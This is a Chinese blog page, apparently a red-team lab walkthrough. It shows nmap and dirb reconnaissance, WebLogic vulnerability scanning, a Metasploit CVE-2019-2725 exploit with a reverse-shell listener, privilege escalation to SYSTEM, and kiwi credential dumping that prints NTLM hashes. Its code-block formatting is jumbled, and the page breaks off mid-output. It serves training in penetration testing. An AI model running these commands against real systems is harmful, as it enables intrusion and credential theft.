@@ -1,0 +1,935 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/zh-CN/img/book.png">
+  <link rel="icon" href="/zh-CN/img/book.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ixpqxi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、主机发现1nmap 192.168.142.0&#x2F;24 | findstr &quot;Nmap scan report for&quot;   Nmap scan report for 192.168.142.170 Nmap scan report for 192.168.142.171 12345### 二、服务操作系统扫描 nmap -sV -O 192.168.142.170    1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="red2">
+<meta property="og:url" content="https://ixpqxi.github.io/zh-CN/2023/03/28/66d37d22c2eb/index.html">
+<meta property="og:site_name" content="Blog">
+<meta property="og:description" content="一、主机发现1nmap 192.168.142.0&#x2F;24 | findstr &quot;Nmap scan report for&quot;   Nmap scan report for 192.168.142.170 Nmap scan report for 192.168.142.171 12345### 二、服务操作系统扫描 nmap -sV -O 192.168.142.170    1">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-28T09:29:44.000Z">
+<meta property="article:modified_time" content="2025-10-26T05:08:47.410Z">
+<meta property="article:author" content="ixpqxi">
+<meta property="article:tag" content="web security">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>red2 - Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/zh-CN/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/zh-CN/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/zh-CN/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ixpqxi.github.io","root":"/zh-CN/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"49a544c5bc9684d15c82cd27375dd996","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/zh-CN/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/zh-CN/js/utils.js" ></script>
+  <script  src="/zh-CN/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?49a544c5bc9684d15c82cd27375dd996";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/zh-CN/atom.xml" title="Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/zh-CN/">
+      <strong>ixpqxi</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/zh-CN/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/zh-CN/projects/" target="_self">
+                <i class="iconfont icon-code"></i>
+                <span>项目</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/zh-CN/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/zh-CN/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/zh-CN/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/zh-CN/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-global"></i>
+                <span>Language</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/zh-CN/" target="_self">
+                    
+                    <span>中文</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://ixpqxi.github.io/" target="_self">
+                    
+                    <span>English</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/zh-CN/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="red2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-28 17:29" pubdate>
+          2023年3月28日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          957 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">red2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.142.0</span>/<span class="hljs-number">24</span> | findstr <span class="hljs-string">&quot;Nmap scan report for&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><pre><code class="hljs">Nmap scan report for 192.168.142.170
+Nmap scan report for 192.168.142.171
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br><br><br>### 二、服务操作系统扫描<br><br></code></pre></td></tr></table></figure>
+nmap -sV -O 192.168.142.170
+</code></pre>
+</li>
+</ul>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>+ ```<br>  PORT      STATE SERVICE            <span class="hljs-keyword">VERSION</span><br>  <span class="hljs-number">80</span>/tcp    <span class="hljs-keyword">open</span>  http               Microsoft IIS httpd <span class="hljs-number">7.5</span><br>  <span class="hljs-number">135</span>/tcp   <span class="hljs-keyword">open</span>  msrpc              Microsoft Windows RPC<br>  <span class="hljs-number">139</span>/tcp   <span class="hljs-keyword">open</span>  netbios-ssn        Microsoft Windows netbios-ssn<br>  <span class="hljs-number">445</span>/tcp   <span class="hljs-keyword">open</span>  microsoft-ds       Microsoft Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span> microsoft-ds<br>  <span class="hljs-number">1433</span>/tcp  <span class="hljs-keyword">open</span>  ms-<span class="hljs-keyword">sql</span>-s           Microsoft <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span> <span class="hljs-number">2008</span> R2 <span class="hljs-number">10.50</span><span class="hljs-number">.4000</span>; SP2<br>  <span class="hljs-number">3389</span>/tcp  <span class="hljs-keyword">open</span>  ssl/ms-wbt-<span class="hljs-keyword">server</span>?<br>  <span class="hljs-number">7001</span>/tcp  <span class="hljs-keyword">open</span>  http               Oracle WebLogic <span class="hljs-keyword">Server</span> (Servlet <span class="hljs-number">2.5</span>; JSP <span class="hljs-number">2.1</span>)<br>  <span class="hljs-number">49152</span>/tcp <span class="hljs-keyword">open</span>  msrpc              Microsoft Windows RPC<br>  <span class="hljs-number">49153</span>/tcp <span class="hljs-keyword">open</span>  msrpc              Microsoft Windows RPC<br>  <span class="hljs-number">49154</span>/tcp <span class="hljs-keyword">open</span>  msrpc              Microsoft Windows RPC<br>  <span class="hljs-number">49155</span>/tcp <span class="hljs-keyword">open</span>  msrpc              Microsoft Windows RPC<br>  <span class="hljs-number">49156</span>/tcp <span class="hljs-keyword">open</span>  msrpc              Microsoft Windows RPC<br>  <br>  Running (JUST GUESSING): Microsoft Windows <span class="hljs-number">7</span>|Vista|<span class="hljs-number">2008</span>|<span class="hljs-number">8.1</span>|Phone|<span class="hljs-number">2012</span> (<span class="hljs-number">98</span>%)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -O <span class="hljs-number">192.168.142.171</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><pre><code class="hljs">PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: DE1AY)
+3389/tcp  open  ssl/ms-wbt-server?
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+
+Running: Microsoft Windows 7
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br><br><br><br>### 三、目录扫描<br><br>扫描`http:<span class="hljs-comment">//192.168.142.170`/</span><br><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<p>dirb <a target="_blank" rel="noopener" href="http://192.168.142.170:7001/">http://192.168.142.170:7001/</a></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><br>+ ```<br>  <span class="hljs-params">----</span> Scanning URL: http:<span class="hljs-string">//192.168.142.170</span><span class="hljs-function">:7001</span>/ <span class="hljs-params">----</span><br>  + http:<span class="hljs-string">//192.168.142.170</span><span class="hljs-function">:7001</span>/console <span class="hljs-params">(CODE:200|SIZE:416)</span>                            <br>  <br>  ==&gt; DIRECTORY: http:<span class="hljs-string">//192.168.142.170</span><span class="hljs-function">:7001</span>/uddi/                                     <br>                                                                                       <br>  <span class="hljs-params">----</span> Entering directory: http:<span class="hljs-string">//192.168.142.170</span><span class="hljs-function">:7001</span>/uddi/ <span class="hljs-params">----</span><br>  ==&gt; DIRECTORY: http:<span class="hljs-string">//192.168.142.170</span><span class="hljs-function">:7001</span>/uddi/images/                              <br>                                                                                   <br>  <span class="hljs-params">----</span> Entering directory: http:<span class="hljs-string">//192.168.142.170</span><span class="hljs-function">:7001</span>/uddi/images/ <span class="hljs-params">----</span><br></code></pre></td></tr></table></figure>
+
+<p>  访问发现都没啥用</p>
+<h3 id="四、通过WebLogic拿shell"><a href="#四、通过WebLogic拿shell" class="headerlink" title="四、通过WebLogic拿shell"></a>四、通过WebLogic拿shell</h3><p>发现<code>192.168.142.170</code>的7001端口的<code>Oracle WebLogic Server</code>，随后启动WeblogicScan扫描漏洞</p>
+<p>使用的WeblogicScan项目地址为<a target="_blank" rel="noopener" href="https://github.com/dr0op/WeblogicScan.git">https://github.com/dr0op/WeblogicScan.git</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> WeblogicScan.py <span class="hljs-number">192.168.142.170</span> <span class="hljs-number">7001</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><pre><code class="hljs">[*]开始检测 weblogic-console
+[+]The target Weblogic console address is exposed!
+[+]The path is: http://192.168.142.170:7001/console/login/LoginForm.jsp
+[+]Please try weak password blasting!
+[+]Weblogic后台路径存在
+[*]开始检测 SSRF
+[+]The target Weblogic UDDI module is exposed!
+[+]The path is: http://192.168.142.170:7001/uddiexplorer/
+[+]Please verify the SSRF vulnerability!
+[+]SSRF 漏洞存在
+[*]开始检测 CVE20192725
+[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725
+[+]CVE-2019-2725 漏洞存在
+[*]开始检测 CVE20192729
+[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729
+[+]CVE-2019-2729 漏洞存在
+[*]开始检测 CVE201710271
+[-]Target weblogic not detected CVE-2017-10271
+[*]开始检测 CVE20173506
+[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506
+[+]CVE-2017-3506 漏洞存在
+[*]开始检测 CVE20192618
+[-]口令爆破失败：weblogic/weblogic
+[-]口令爆破失败：weblogic/weblogic1
+[-]口令爆破失败：weblogic/weblogic10
+[-]口令爆破失败：weblogic/weblogic123
+[-]口令爆破失败：weblogic/Oracle@123
+[-]target Weblogic is not Vul CVE-2019-2618
+[*]开始检测 CVE20182894
+[-]Target weblogic not detected CVE-2018-2894
+[*]开始检测 CVE20182628
+[-]CVE20182628 未成功检测，请检查网络连接或或目标存在负载中间件
+[*]开始检测 CVE20182893
+[-]CVE20182893 未成功检测，请检查网络连接或或目标存在负载中间件
+[*]开始检测 CVE20160638
+[-]Target weblogic not detected CVE-2016-0638
+[*]开始检测 CVE20163510
+[-]Target weblogic not detected CVE-2016-3510
+[*]开始检测 CVE20173248
+[-]Target weblogic not detected CVE-2017-3248
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><br>通过MSF利用CVE<span class="hljs-string">-2019</span><span class="hljs-string">-2725</span>漏洞<br><br></code></pre></td></tr></table></figure>
+use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
+set lhost 192.168.142.13
+set rhosts 192.168.142.170
+set lport 9999
+set target 1
+set paylaod
+</code></pre>
+</li>
+</ul>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><br><span class="hljs-keyword">run</span>后返回<span class="hljs-built_in">shell</span>，这里如果一次不能成功，需要尝试多<span class="hljs-keyword">run</span>几次<br><br><br><br><span class="hljs-meta">### 五、权限提升</span><br><br>获得的<span class="hljs-built_in">shell</span>为`de1ay\administrator`<br><br></code></pre></td></tr></table></figure>
+<p>whoami</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>+ ```<br>  de1ay\administrator<br></code></pre></td></tr></table></figure>
+
+<p>将其提升到system权限以方便后面内网渗透</p>
+<p>先将进程迁移到64位的进程上</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">meterpreter</span> &gt; ps<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><pre><code class="hljs">......
+4584  4916  conhost.exe   x64   4        DE1AY\Administrator   C:\Windows\System32\conhost.exe
+.....
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+meterpreter &gt; migrate 4584
+</code></pre>
+</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><br>+ ```<br>  <span class="hljs-selector-attr">[*]</span> Migrating <span class="hljs-selector-tag">from</span> <span class="hljs-number">904</span> <span class="hljs-selector-tag">to</span> <span class="hljs-number">4584</span>...<br>  <span class="hljs-selector-attr">[*]</span> Migration completed successfully.<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">meterpreter</span> &gt; getsystem<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><pre><code class="hljs">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+meterpreter &gt; getuid
+</code></pre>
+</li>
+</ul>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>+ ```<br><span class="hljs-title">  Server username:</span> NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="六、内网信息收集"><a href="#六、内网信息收集" class="headerlink" title="六、内网信息收集"></a>六、内网信息收集</h3><h5 id="1-本机信息收集"><a href="#1-本机信息收集" class="headerlink" title="1.本机信息收集"></a>1.本机信息收集</h5><p>网络信息收集</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">C:\Windows\<span class="hljs-params">system</span>32&gt;ipconfig /<span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><pre><code class="hljs">Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : WEB
+   Primary Dns Suffix  . . . . . . . : de1ay.com
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : de1ay.com
+                                       localdomain
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><br>  可以从`Primary Dns Suffix`发现存在域环境<br><br>+ ```<br>  Connection-specific DNS Suffix  . : <br>  Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2<br>  Physical Address. . . . . . . . . : 00<span class="hljs-string">-0</span>C<span class="hljs-string">-29</span><span class="hljs-string">-68</span>-D3<span class="hljs-string">-69</span><br>  DHCP Enabled. . . . . . . . . . . : No<br>  Autoconfiguration Enabled . . . . : Yes<br>  Link-local IPv6 Address . . . . . : fe80::e8e4:f653:f5de:f864%13(Preferred) <br>  IPv4 Address. . . . . . . . . . . : 10.10.10.80(Preferred) <br>  Subnet Mask . . . . . . . . . . . : 255.255.255.0<br>  Default Gateway . . . . . . . . . : 10.10.10.1<br>  DHCPv6 IAID . . . . . . . . . . . : 301993001<br>  DHCPv6 Client DUID. . . . . . . . : 00<span class="hljs-string">-01</span><span class="hljs-string">-00</span><span class="hljs-string">-01</span><span class="hljs-string">-25</span><span class="hljs-string">-06</span><span class="hljs-string">-97</span><span class="hljs-string">-6</span>A<span class="hljs-string">-00</span><span class="hljs-string">-0</span>C<span class="hljs-string">-29</span><span class="hljs-string">-68</span>-D3<span class="hljs-string">-5</span>F<br>  DNS Servers . . . . . . . . . . . : 10.10.10.10<br>  NetBIOS over Tcpip. . . . . . . . : Enabled<br></code></pre></td></tr></table></figure>
+
+发现内网网段
+</code></pre>
+</li>
+<li><pre><code class="hljs">Connection-specific DNS Suffix  . : localdomain
+Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+Physical Address. . . . . . . . . : 00-0C-29-68-D3-5F
+DHCP Enabled. . . . . . . . . . . : Yes
+Autoconfiguration Enabled . . . . : Yes
+Link-local IPv6 Address . . . . . : fe80::cca:90b1:878f:75ce%11(Preferred) 
+IPv4 Address. . . . . . . . . . . : 192.168.142.170(Preferred) 
+Subnet Mask . . . . . . . . . . . : 255.255.255.0
+Lease Obtained. . . . . . . . . . : 2023��3��28�� 17:28:14
+Lease Expires . . . . . . . . . . : 2023��3��28�� 20:55:37
+Default Gateway . . . . . . . . . : 192.168.142.2
+DHCP Server . . . . . . . . . . . : 192.168.142.254
+DHCPv6 IAID . . . . . . . . . . . : 234884137
+DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
+DNS Servers . . . . . . . . . . . : 192.168.142.2
+Primary WINS Server . . . . . . . : 192.168.142.2
+NetBIOS over Tcpip. . . . . . . . : Enabled
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs"><br>  外网网段<br><br>密码信息收集<br><br>导入kiwi模块读取密码信息<br><br></code></pre></td></tr></table></figure>
+meterpreter &gt; load kiwi
+meterpreter &gt; creds_all
+</code></pre>
+</li>
+</ul>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>+ ```<br>  msv credentials<br>  <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>  <br>  Username       Domain  LM                   NTLM                 SHA<span class="hljs-number">1</span><br>  --------       ------  --                   ----                 ----<br>  Administrator  DE<span class="hljs-number">1</span>AY   f<span class="hljs-number">67</span>ce<span class="hljs-number">55</span>ac<span class="hljs-number">831223</span>dc<span class="hljs-number">18</span>  <span class="hljs-number">161</span>cff<span class="hljs-number">084477</span>fe<span class="hljs-number">596</span>a<span class="hljs-number">5</span>  d<span class="hljs-number">669</span>f<span class="hljs-number">3</span>bccf<span class="hljs-number">14</span>bf<span class="hljs-number">77</span>d<span class="hljs-number">64</span><br>                         <span class="hljs-number">7</span>b<span class="hljs-number">8085</span>fe<span class="hljs-number">1</span>d<span class="hljs-number">9</span>df        db<span class="hljs-number">81874498</span>a<span class="hljs-number">24</span>        <span class="hljs-number">667</span>ec<span class="hljs-number">65</span>aae<span class="hljs-number">32</span>d<span class="hljs-number">2</span>d<span class="hljs-number">1003</span><br>                                                                   <span class="hljs-number">9</span>d<br>  WEB$           DE<span class="hljs-number">1</span>AY                        <span class="hljs-number">73805069e2</span><span class="hljs-keyword">c</span><span class="hljs-number">7227</span>f<span class="hljs-number">110</span>  b<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">99</span>cab<span class="hljs-number">2</span>eebaf<span class="hljs-number">54</span>cbd<br>                                              